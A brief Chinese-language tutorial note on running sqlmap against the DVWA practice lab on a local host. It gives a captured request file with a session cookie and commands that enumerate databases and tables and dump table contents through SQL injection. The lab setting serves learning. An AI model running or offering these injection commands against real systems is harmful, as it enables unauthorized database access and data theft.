# sqlmap数据库检测

1.扫描数据库中的表，其中`test.txt`中包含请求头

```
python2.7 sqlmap.py -r test.txt --dbs
```

text.txt内容

```
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: dvwa.localhost
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://dvwa.localhost/vulnerabilities/sqli/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,la;q=0.6
Cookie: PHPSESSID=sm4ui6j4hros62n7vie2c845m3; security=low
```

也可以使用命令

```
python2.7 sqlmap.py -u "http://dvwa.localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=sm4ui6j4hros62n7vie2c845m3; security=low" --dbs
```

2.获取数据表名称

```
python2.7 sqlmap.py -r test.txt --tables
```

也可以使用那个长的命令，类似于1

3.查看表数据

```
python2.7 sqlmap.py -r test.txt -D 数据库名 --dump -T 表名
```

